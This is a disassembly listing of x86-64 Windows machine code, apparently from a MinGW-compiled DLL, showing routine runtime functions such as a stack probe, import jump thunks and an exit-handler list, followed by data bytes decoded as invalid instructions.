    6d8ce429:	8b 90 90 00 00 00    	mov    0x90(%rax),%edx
    6d8ce42f:	85 d2                	test   %edx,%edx
    6d8ce431:	74 3b                	je     0x6d8ce46e
    6d8ce433:	0f b7 48 14          	movzwl 0x14(%rax),%ecx
    6d8ce437:	48 8d 4c 08 18       	lea    0x18(%rax,%rcx,1),%rcx
    6d8ce43c:	0f b7 40 06          	movzwl 0x6(%rax),%eax
    6d8ce440:	85 c0                	test   %eax,%eax
    6d8ce442:	74 2a                	je     0x6d8ce46e
    6d8ce444:	83 e8 01             	sub    $0x1,%eax
    6d8ce447:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
    6d8ce44b:	48 8d 44 c1 28       	lea    0x28(%rcx,%rax,8),%rax
    6d8ce450:	44 8b 51 0c          	mov    0xc(%rcx),%r10d
    6d8ce454:	4c 39 d2             	cmp    %r10,%rdx
    6d8ce457:	4d 89 d0             	mov    %r10,%r8
    6d8ce45a:	72 09                	jb     0x6d8ce465
    6d8ce45c:	44 03 41 08          	add    0x8(%rcx),%r8d
    6d8ce460:	4c 39 c2             	cmp    %r8,%rdx
    6d8ce463:	72 10                	jb     0x6d8ce475
    6d8ce465:	48 83 c1 28          	add    $0x28,%rcx
    6d8ce469:	48 39 c1             	cmp    %rax,%rcx
    6d8ce46c:	75 e2                	jne    0x6d8ce450
    6d8ce46e:	31 c0                	xor    %eax,%eax
    6d8ce470:	48 83 c4 28          	add    $0x28,%rsp
    6d8ce474:	c3                   	ret
    6d8ce475:	4c 01 da             	add    %r11,%rdx
    6d8ce478:	75 0e                	jne    0x6d8ce488
    6d8ce47a:	eb f2                	jmp    0x6d8ce46e
    6d8ce47c:	0f 1f 40 00          	nopl   0x0(%rax)
    6d8ce480:	41 83 e9 01          	sub    $0x1,%r9d
    6d8ce484:	48 83 c2 14          	add    $0x14,%rdx
    6d8ce488:	8b 4a 04             	mov    0x4(%rdx),%ecx
    6d8ce48b:	85 c9                	test   %ecx,%ecx
    6d8ce48d:	75 07                	jne    0x6d8ce496
    6d8ce48f:	8b 42 0c             	mov    0xc(%rdx),%eax
    6d8ce492:	85 c0                	test   %eax,%eax
    6d8ce494:	74 d8                	je     0x6d8ce46e
    6d8ce496:	45 85 c9             	test   %r9d,%r9d
    6d8ce499:	7f e5                	jg     0x6d8ce480
    6d8ce49b:	8b 42 0c             	mov    0xc(%rdx),%eax
    6d8ce49e:	4c 01 d8             	add    %r11,%rax
    6d8ce4a1:	48 83 c4 28          	add    $0x28,%rsp
    6d8ce4a5:	c3                   	ret
    6d8ce4a6:	90                   	nop
    6d8ce4a7:	90                   	nop
    6d8ce4a8:	90                   	nop
    6d8ce4a9:	90                   	nop
    6d8ce4aa:	90                   	nop
    6d8ce4ab:	90                   	nop
    6d8ce4ac:	90                   	nop
    6d8ce4ad:	90                   	nop
    6d8ce4ae:	90                   	nop
    6d8ce4af:	90                   	nop
    6d8ce4b0:	db e3                	fninit
    6d8ce4b2:	c3                   	ret
    6d8ce4b3:	90                   	nop
    6d8ce4b4:	90                   	nop
    6d8ce4b5:	90                   	nop
    6d8ce4b6:	90                   	nop
    6d8ce4b7:	90                   	nop
    6d8ce4b8:	90                   	nop
    6d8ce4b9:	90                   	nop
    6d8ce4ba:	90                   	nop
    6d8ce4bb:	90                   	nop
    6d8ce4bc:	90                   	nop
    6d8ce4bd:	90                   	nop
    6d8ce4be:	90                   	nop
    6d8ce4bf:	90                   	nop
    6d8ce4c0:	51                   	push   %rcx
    6d8ce4c1:	50                   	push   %rax
    6d8ce4c2:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
    6d8ce4c8:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
    6d8ce4cd:	72 19                	jb     0x6d8ce4e8
    6d8ce4cf:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
    6d8ce4d6:	48 83 09 00          	orq    $0x0,(%rcx)
    6d8ce4da:	48 2d 00 10 00 00    	sub    $0x1000,%rax
    6d8ce4e0:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
    6d8ce4e6:	77 e7                	ja     0x6d8ce4cf
    6d8ce4e8:	48 29 c1             	sub    %rax,%rcx
    6d8ce4eb:	48 83 09 00          	orq    $0x0,(%rcx)
    6d8ce4ef:	58                   	pop    %rax
    6d8ce4f0:	59                   	pop    %rcx
    6d8ce4f1:	c3                   	ret
    6d8ce4f2:	90                   	nop
    6d8ce4f3:	90                   	nop
    6d8ce4f4:	90                   	nop
    6d8ce4f5:	90                   	nop
    6d8ce4f6:	90                   	nop
    6d8ce4f7:	90                   	nop
    6d8ce4f8:	90                   	nop
    6d8ce4f9:	90                   	nop
    6d8ce4fa:	90                   	nop
    6d8ce4fb:	90                   	nop
    6d8ce4fc:	90                   	nop
    6d8ce4fd:	90                   	nop
    6d8ce4fe:	90                   	nop
    6d8ce4ff:	90                   	nop
    6d8ce500:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8ce505:	c3                   	ret
    6d8ce506:	90                   	nop
    6d8ce507:	90                   	nop
    6d8ce508:	90                   	nop
    6d8ce509:	90                   	nop
    6d8ce50a:	90                   	nop
    6d8ce50b:	90                   	nop
    6d8ce50c:	90                   	nop
    6d8ce50d:	90                   	nop
    6d8ce50e:	90                   	nop
    6d8ce50f:	90                   	nop
    6d8ce510:	48 8d 44 24 08       	lea    0x8(%rsp),%rax
    6d8ce515:	c3                   	ret
    6d8ce516:	48 8d 05 27 2e 10 00 	lea    0x102e27(%rip),%rax        # 0x6d9d1344
    6d8ce51d:	ff 20                	jmp    *(%rax)
    6d8ce51f:	90                   	nop
    6d8ce520:	ff 25 66 2e 10 00    	jmp    *0x102e66(%rip)        # 0x6d9d138c
    6d8ce526:	90                   	nop
    6d8ce527:	90                   	nop
    6d8ce528:	ff 25 56 2e 10 00    	jmp    *0x102e56(%rip)        # 0x6d9d1384
    6d8ce52e:	90                   	nop
    6d8ce52f:	90                   	nop
    6d8ce530:	ff 25 46 2e 10 00    	jmp    *0x102e46(%rip)        # 0x6d9d137c
    6d8ce536:	90                   	nop
    6d8ce537:	90                   	nop
    6d8ce538:	ff 25 36 2e 10 00    	jmp    *0x102e36(%rip)        # 0x6d9d1374
    6d8ce53e:	90                   	nop
    6d8ce53f:	90                   	nop
    6d8ce540:	ff 25 26 2e 10 00    	jmp    *0x102e26(%rip)        # 0x6d9d136c
    6d8ce546:	90                   	nop
    6d8ce547:	90                   	nop
    6d8ce548:	ff 25 0e 2e 10 00    	jmp    *0x102e0e(%rip)        # 0x6d9d135c
    6d8ce54e:	90                   	nop
    6d8ce54f:	90                   	nop
    6d8ce550:	ff 25 fe 2d 10 00    	jmp    *0x102dfe(%rip)        # 0x6d9d1354
    6d8ce556:	90                   	nop
    6d8ce557:	90                   	nop
    6d8ce558:	ff 25 ee 2d 10 00    	jmp    *0x102dee(%rip)        # 0x6d9d134c
    6d8ce55e:	90                   	nop
    6d8ce55f:	90                   	nop
    6d8ce560:	ff 25 d6 2d 10 00    	jmp    *0x102dd6(%rip)        # 0x6d9d133c
    6d8ce566:	90                   	nop
    6d8ce567:	90                   	nop
    6d8ce568:	ff 25 c6 2d 10 00    	jmp    *0x102dc6(%rip)        # 0x6d9d1334
    6d8ce56e:	90                   	nop
    6d8ce56f:	90                   	nop
    6d8ce570:	ff 25 b6 2d 10 00    	jmp    *0x102db6(%rip)        # 0x6d9d132c
    6d8ce576:	90                   	nop
    6d8ce577:	90                   	nop
    6d8ce578:	ff 25 a6 2d 10 00    	jmp    *0x102da6(%rip)        # 0x6d9d1324
    6d8ce57e:	90                   	nop
    6d8ce57f:	90                   	nop
    6d8ce580:	ff 25 96 2d 10 00    	jmp    *0x102d96(%rip)        # 0x6d9d131c
    6d8ce586:	90                   	nop
    6d8ce587:	90                   	nop
    6d8ce588:	ff 25 86 2d 10 00    	jmp    *0x102d86(%rip)        # 0x6d9d1314
    6d8ce58e:	90                   	nop
    6d8ce58f:	90                   	nop
    6d8ce590:	ff 25 76 2d 10 00    	jmp    *0x102d76(%rip)        # 0x6d9d130c
    6d8ce596:	90                   	nop
    6d8ce597:	90                   	nop
    6d8ce598:	ff 25 66 2d 10 00    	jmp    *0x102d66(%rip)        # 0x6d9d1304
    6d8ce59e:	90                   	nop
    6d8ce59f:	90                   	nop
    6d8ce5a0:	ff 25 4e 2d 10 00    	jmp    *0x102d4e(%rip)        # 0x6d9d12f4
    6d8ce5a6:	90                   	nop
    6d8ce5a7:	90                   	nop
    6d8ce5a8:	ff 25 3e 2d 10 00    	jmp    *0x102d3e(%rip)        # 0x6d9d12ec
    6d8ce5ae:	90                   	nop
    6d8ce5af:	90                   	nop
    6d8ce5b0:	ff 25 26 2d 10 00    	jmp    *0x102d26(%rip)        # 0x6d9d12dc
    6d8ce5b6:	90                   	nop
    6d8ce5b7:	90                   	nop
    6d8ce5b8:	ff 25 16 2d 10 00    	jmp    *0x102d16(%rip)        # 0x6d9d12d4
    6d8ce5be:	90                   	nop
    6d8ce5bf:	90                   	nop
    6d8ce5c0:	ff 25 06 2d 10 00    	jmp    *0x102d06(%rip)        # 0x6d9d12cc
    6d8ce5c6:	90                   	nop
    6d8ce5c7:	90                   	nop
    6d8ce5c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6d8ce5cf:	00 
    6d8ce5d0:	48 85 c9             	test   %rcx,%rcx
    6d8ce5d3:	74 1a                	je     0x6d8ce5ef
    6d8ce5d5:	31 c0                	xor    %eax,%eax
    6d8ce5d7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
    6d8ce5de:	00 
    6d8ce5df:	48 c7 41 08 00 00 00 	movq   $0x0,0x8(%rcx)
    6d8ce5e6:	00 
    6d8ce5e7:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
    6d8ce5ee:	c3                   	ret
    6d8ce5ef:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    6d8ce5f4:	c3                   	ret
    6d8ce5f5:	90                   	nop
    6d8ce5f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6d8ce5fd:	00 00 00 
    6d8ce600:	55                   	push   %rbp
    6d8ce601:	57                   	push   %rdi
    6d8ce602:	56                   	push   %rsi
    6d8ce603:	53                   	push   %rbx
    6d8ce604:	48 83 ec 28          	sub    $0x28,%rsp
    6d8ce608:	48 85 c9             	test   %rcx,%rcx
    6d8ce60b:	48 89 cb             	mov    %rcx,%rbx
    6d8ce60e:	48 89 d7             	mov    %rdx,%rdi
    6d8ce611:	0f 84 99 00 00 00    	je     0x6d8ce6b0
    6d8ce617:	b9 08 00 00 00       	mov    $0x8,%ecx
    6d8ce61c:	e8 4f 01 00 00       	call   0x6d8ce770
    6d8ce621:	48 83 3b 00          	cmpq   $0x0,(%rbx)
    6d8ce625:	74 5d                	je     0x6d8ce684
    6d8ce627:	48 8b 73 08          	mov    0x8(%rbx),%rsi
    6d8ce62b:	48 8b 43 10          	mov    0x10(%rbx),%rax
    6d8ce62f:	48 39 f0             	cmp    %rsi,%rax
    6d8ce632:	74 20                	je     0x6d8ce654
    6d8ce634:	48 8d 46 08          	lea    0x8(%rsi),%rax
    6d8ce638:	b9 08 00 00 00       	mov    $0x8,%ecx
    6d8ce63d:	48 89 43 08          	mov    %rax,0x8(%rbx)
    6d8ce641:	48 89 3e             	mov    %rdi,(%rsi)
    6d8ce644:	e8 1f 01 00 00       	call   0x6d8ce768
    6d8ce649:	31 c0                	xor    %eax,%eax
    6d8ce64b:	48 83 c4 28          	add    $0x28,%rsp
    6d8ce64f:	5b                   	pop    %rbx
    6d8ce650:	5e                   	pop    %rsi
    6d8ce651:	5f                   	pop    %rdi
    6d8ce652:	5d                   	pop    %rbp
    6d8ce653:	c3                   	ret
    6d8ce654:	48 8b 0b             	mov    (%rbx),%rcx
    6d8ce657:	48 29 ce             	sub    %rcx,%rsi
    6d8ce65a:	48 89 f0             	mov    %rsi,%rax
    6d8ce65d:	48 c1 f8 03          	sar    $0x3,%rax
    6d8ce661:	48 c1 e0 04          	shl    $0x4,%rax
    6d8ce665:	48 89 c2             	mov    %rax,%rdx
    6d8ce668:	48 89 c5             	mov    %rax,%rbp
    6d8ce66b:	e8 f0 00 00 00       	call   0x6d8ce760
    6d8ce670:	48 85 c0             	test   %rax,%rax
    6d8ce673:	74 42                	je     0x6d8ce6b7
    6d8ce675:	48 89 03             	mov    %rax,(%rbx)
    6d8ce678:	48 01 c6             	add    %rax,%rsi
    6d8ce67b:	48 01 e8             	add    %rbp,%rax
    6d8ce67e:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6d8ce682:	eb b0                	jmp    0x6d8ce634
    6d8ce684:	ba 08 00 00 00       	mov    $0x8,%edx
    6d8ce689:	b9 20 00 00 00       	mov    $0x20,%ecx
    6d8ce68e:	e8 fd fe ff ff       	call   0x6d8ce590
    6d8ce693:	48 85 c0             	test   %rax,%rax
    6d8ce696:	48 89 c6             	mov    %rax,%rsi
    6d8ce699:	48 89 03             	mov    %rax,(%rbx)
    6d8ce69c:	74 19                	je     0x6d8ce6b7
    6d8ce69e:	48 89 43 08          	mov    %rax,0x8(%rbx)
    6d8ce6a2:	48 8d 80 00 01 00 00 	lea    0x100(%rax),%rax
    6d8ce6a9:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6d8ce6ad:	eb 80                	jmp    0x6d8ce62f
    6d8ce6af:	90                   	nop
    6d8ce6b0:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    6d8ce6b5:	eb 94                	jmp    0x6d8ce64b
    6d8ce6b7:	b9 08 00 00 00       	mov    $0x8,%ecx
    6d8ce6bc:	e8 a7 00 00 00       	call   0x6d8ce768
    6d8ce6c1:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    6d8ce6c6:	eb 83                	jmp    0x6d8ce64b
    6d8ce6c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6d8ce6cf:	00 
    6d8ce6d0:	57                   	push   %rdi
    6d8ce6d1:	56                   	push   %rsi
    6d8ce6d2:	53                   	push   %rbx
    6d8ce6d3:	48 83 ec 20          	sub    $0x20,%rsp
    6d8ce6d7:	48 89 cf             	mov    %rcx,%rdi
    6d8ce6da:	b9 08 00 00 00       	mov    $0x8,%ecx
    6d8ce6df:	e8 8c 00 00 00       	call   0x6d8ce770
    6d8ce6e4:	48 8b 37             	mov    (%rdi),%rsi
    6d8ce6e7:	b9 08 00 00 00       	mov    $0x8,%ecx
    6d8ce6ec:	48 c7 47 10 00 00 00 	movq   $0x0,0x10(%rdi)
    6d8ce6f3:	00 
    6d8ce6f4:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
    6d8ce6f8:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
    6d8ce6ff:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
    6d8ce706:	00 
    6d8ce707:	e8 5c 00 00 00       	call   0x6d8ce768
    6d8ce70c:	48 85 f6             	test   %rsi,%rsi
    6d8ce70f:	74 24                	je     0x6d8ce735
    6d8ce711:	48 83 eb 08          	sub    $0x8,%rbx
    6d8ce715:	48 39 de             	cmp    %rbx,%rsi
    6d8ce718:	77 13                	ja     0x6d8ce72d
    6d8ce71a:	48 8b 03             	mov    (%rbx),%rax
    6d8ce71d:	48 85 c0             	test   %rax,%rax
    6d8ce720:	74 ef                	je     0x6d8ce711
    6d8ce722:	ff d0                	call   *%rax
    6d8ce724:	48 83 eb 08          	sub    $0x8,%rbx
    6d8ce728:	48 39 de             	cmp    %rbx,%rsi
    6d8ce72b:	76 ed                	jbe    0x6d8ce71a
    6d8ce72d:	48 89 f1             	mov    %rsi,%rcx
    6d8ce730:	e8 33 fe ff ff       	call   0x6d8ce568
    6d8ce735:	31 c0                	xor    %eax,%eax
    6d8ce737:	48 83 c4 20          	add    $0x20,%rsp
    6d8ce73b:	5b                   	pop    %rbx
    6d8ce73c:	5e                   	pop    %rsi
    6d8ce73d:	5f                   	pop    %rdi
    6d8ce73e:	c3                   	ret
    6d8ce73f:	90                   	nop
    6d8ce740:	53                   	push   %rbx
    6d8ce741:	48 83 ec 20          	sub    $0x20,%rsp
    6d8ce745:	89 cb                	mov    %ecx,%ebx
    6d8ce747:	e8 2c 00 00 00       	call   0x6d8ce778
    6d8ce74c:	89 d9                	mov    %ebx,%ecx
    6d8ce74e:	48 8d 14 49          	lea    (%rcx,%rcx,2),%rdx
    6d8ce752:	48 c1 e2 04          	shl    $0x4,%rdx
    6d8ce756:	48 01 d0             	add    %rdx,%rax
    6d8ce759:	48 83 c4 20          	add    $0x20,%rsp
    6d8ce75d:	5b                   	pop    %rbx
    6d8ce75e:	c3                   	ret
    6d8ce75f:	90                   	nop
    6d8ce760:	ff 25 fe 2b 10 00    	jmp    *0x102bfe(%rip)        # 0x6d9d1364
    6d8ce766:	90                   	nop
    6d8ce767:	90                   	nop
    6d8ce768:	ff 25 8e 2b 10 00    	jmp    *0x102b8e(%rip)        # 0x6d9d12fc
    6d8ce76e:	90                   	nop
    6d8ce76f:	90                   	nop
    6d8ce770:	ff 25 6e 2b 10 00    	jmp    *0x102b6e(%rip)        # 0x6d9d12e4
    6d8ce776:	90                   	nop
    6d8ce777:	90                   	nop
    6d8ce778:	ff 25 46 2b 10 00    	jmp    *0x102b46(%rip)        # 0x6d9d12c4
    6d8ce77e:	90                   	nop
    6d8ce77f:	90                   	nop
    6d8ce780:	ff 25 2e 2b 10 00    	jmp    *0x102b2e(%rip)        # 0x6d9d12b4
    6d8ce786:	90                   	nop
    6d8ce787:	90                   	nop
    6d8ce788:	ff 25 1e 2b 10 00    	jmp    *0x102b1e(%rip)        # 0x6d9d12ac
    6d8ce78e:	90                   	nop
    6d8ce78f:	90                   	nop
    6d8ce790:	ff 25 0e 2b 10 00    	jmp    *0x102b0e(%rip)        # 0x6d9d12a4
    6d8ce796:	90                   	nop
    6d8ce797:	90                   	nop
    6d8ce798:	ff 25 fe 2a 10 00    	jmp    *0x102afe(%rip)        # 0x6d9d129c
    6d8ce79e:	90                   	nop
    6d8ce79f:	90                   	nop
    6d8ce7a0:	ff 25 ee 2a 10 00    	jmp    *0x102aee(%rip)        # 0x6d9d1294
    6d8ce7a6:	90                   	nop
    6d8ce7a7:	90                   	nop
    6d8ce7a8:	ff 25 de 2a 10 00    	jmp    *0x102ade(%rip)        # 0x6d9d128c
    6d8ce7ae:	90                   	nop
    6d8ce7af:	90                   	nop
    6d8ce7b0:	ff 25 ce 2a 10 00    	jmp    *0x102ace(%rip)        # 0x6d9d1284
    6d8ce7b6:	90                   	nop
    6d8ce7b7:	90                   	nop
    6d8ce7b8:	ff 25 be 2a 10 00    	jmp    *0x102abe(%rip)        # 0x6d9d127c
    6d8ce7be:	90                   	nop
    6d8ce7bf:	90                   	nop
    6d8ce7c0:	ff 25 ae 2a 10 00    	jmp    *0x102aae(%rip)        # 0x6d9d1274
    6d8ce7c6:	90                   	nop
    6d8ce7c7:	90                   	nop
    6d8ce7c8:	ff 25 9e 2a 10 00    	jmp    *0x102a9e(%rip)        # 0x6d9d126c
    6d8ce7ce:	90                   	nop
    6d8ce7cf:	90                   	nop
    6d8ce7d0:	ff 25 8e 2a 10 00    	jmp    *0x102a8e(%rip)        # 0x6d9d1264
    6d8ce7d6:	90                   	nop
    6d8ce7d7:	90                   	nop
    6d8ce7d8:	ff 25 7e 2a 10 00    	jmp    *0x102a7e(%rip)        # 0x6d9d125c
    6d8ce7de:	90                   	nop
    6d8ce7df:	90                   	nop
    6d8ce7e0:	ff 25 6e 2a 10 00    	jmp    *0x102a6e(%rip)        # 0x6d9d1254
    6d8ce7e6:	90                   	nop
    6d8ce7e7:	90                   	nop
    6d8ce7e8:	ff 25 5e 2a 10 00    	jmp    *0x102a5e(%rip)        # 0x6d9d124c
    6d8ce7ee:	90                   	nop
    6d8ce7ef:	90                   	nop
    6d8ce7f0:	ff 25 4e 2a 10 00    	jmp    *0x102a4e(%rip)        # 0x6d9d1244
    6d8ce7f6:	90                   	nop
    6d8ce7f7:	90                   	nop
    6d8ce7f8:	ff 25 3e 2a 10 00    	jmp    *0x102a3e(%rip)        # 0x6d9d123c
    6d8ce7fe:	90                   	nop
    6d8ce7ff:	90                   	nop
    6d8ce800:	ff 25 2e 2a 10 00    	jmp    *0x102a2e(%rip)        # 0x6d9d1234
    6d8ce806:	90                   	nop
    6d8ce807:	90                   	nop
    6d8ce808:	ff 25 1e 2a 10 00    	jmp    *0x102a1e(%rip)        # 0x6d9d122c
    6d8ce80e:	90                   	nop
    6d8ce80f:	90                   	nop
    6d8ce810:	ff 25 0e 2a 10 00    	jmp    *0x102a0e(%rip)        # 0x6d9d1224
    6d8ce816:	90                   	nop
    6d8ce817:	90                   	nop
    6d8ce818:	ff 25 fe 29 10 00    	jmp    *0x1029fe(%rip)        # 0x6d9d121c
    6d8ce81e:	90                   	nop
    6d8ce81f:	90                   	nop
    6d8ce820:	ff 25 ee 29 10 00    	jmp    *0x1029ee(%rip)        # 0x6d9d1214
    6d8ce826:	90                   	nop
    6d8ce827:	90                   	nop
    6d8ce828:	ff 25 de 29 10 00    	jmp    *0x1029de(%rip)        # 0x6d9d120c
    6d8ce82e:	90                   	nop
    6d8ce82f:	90                   	nop
    6d8ce830:	ff 25 ce 29 10 00    	jmp    *0x1029ce(%rip)        # 0x6d9d1204
    6d8ce836:	90                   	nop
    6d8ce837:	90                   	nop
    6d8ce838:	ff 25 be 29 10 00    	jmp    *0x1029be(%rip)        # 0x6d9d11fc
    6d8ce83e:	90                   	nop
    6d8ce83f:	90                   	nop
    6d8ce840:	ff 25 ae 29 10 00    	jmp    *0x1029ae(%rip)        # 0x6d9d11f4
    6d8ce846:	90                   	nop
    6d8ce847:	90                   	nop
    6d8ce848:	ff 25 9e 29 10 00    	jmp    *0x10299e(%rip)        # 0x6d9d11ec
    6d8ce84e:	90                   	nop
    6d8ce84f:	90                   	nop
    6d8ce850:	56                   	push   %rsi
    6d8ce851:	53                   	push   %rbx
    6d8ce852:	48 83 ec 38          	sub    $0x38,%rsp
    6d8ce856:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
    6d8ce85b:	48 89 cb             	mov    %rcx,%rbx
    6d8ce85e:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8ce863:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
    6d8ce868:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
    6d8ce86d:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
    6d8ce872:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8ce877:	e8 c4 fe ff ff       	call   0x6d8ce740
    6d8ce87c:	41 b8 1b 00 00 00    	mov    $0x1b,%r8d
    6d8ce882:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8ce887:	48 8d 0d b2 9b 0e 00 	lea    0xe9bb2(%rip),%rcx        # 0x6d9b8440
    6d8ce88e:	49 89 c1             	mov    %rax,%r9
    6d8ce891:	e8 ca fc ff ff       	call   0x6d8ce560
    6d8ce896:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
    6d8ce89b:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8ce8a0:	e8 9b fe ff ff       	call   0x6d8ce740
    6d8ce8a5:	48 89 da             	mov    %rbx,%rdx
    6d8ce8a8:	48 89 c1             	mov    %rax,%rcx
    6d8ce8ab:	49 89 f0             	mov    %rsi,%r8
    6d8ce8ae:	e8 6d fc ff ff       	call   0x6d8ce520
    6d8ce8b3:	e8 e0 fc ff ff       	call   0x6d8ce598
    6d8ce8b8:	90                   	nop
    6d8ce8b9:	90                   	nop
    6d8ce8ba:	90                   	nop
    6d8ce8bb:	90                   	nop
    6d8ce8bc:	90                   	nop
    6d8ce8bd:	90                   	nop
    6d8ce8be:	90                   	nop
    6d8ce8bf:	90                   	nop
    6d8ce8c0:	e9 cb 2a ff ff       	jmp    0x6d8c1390
    6d8ce8c5:	90                   	nop
    6d8ce8c6:	90                   	nop
    6d8ce8c7:	90                   	nop
    6d8ce8c8:	90                   	nop
    6d8ce8c9:	90                   	nop
    6d8ce8ca:	90                   	nop
    6d8ce8cb:	90                   	nop
    6d8ce8cc:	90                   	nop
    6d8ce8cd:	90                   	nop
    6d8ce8ce:	90                   	nop
    6d8ce8cf:	90                   	nop
    6d8ce8d0:	ff                   	(bad)
    6d8ce8d1:	ff                   	(bad)
    6d8ce8d2:	ff                   	(bad)
    6d8ce8d3:	ff                   	(bad)
    6d8ce8d4:	ff                   	(bad)
    6d8ce8d5:	ff                   	(bad)
    6d8ce8d6:	ff                   	(bad)
    6d8ce8d7:	ff c0                	inc    %eax
    6d8ce8d9:	e8 8c 6d 00 00       	call   0x6d8d566a
	...
    6d8ce8e6:	00 00                	add    %al,(%rax)
    6d8ce8e8:	ff                   	(bad)
    6d8ce8e9:	ff                   	(bad)
    6d8ce8ea:	ff                   	(bad)
    6d8ce8eb:	ff                   	(bad)
    6d8ce8ec:	ff                   	(bad)
    6d8ce8ed:	ff                   	(bad)
    6d8ce8ee:	ff                   	(bad)
    6d8ce8ef:	ff 00                	incl   (%rax)
    6d8ce8f1:	00 00                	add    %al,(%rax)
    6d8ce8f3:	00 00                	add    %al,(%rax)
    6d8ce8f5:	00 00                	add    %al,(%rax)
	...
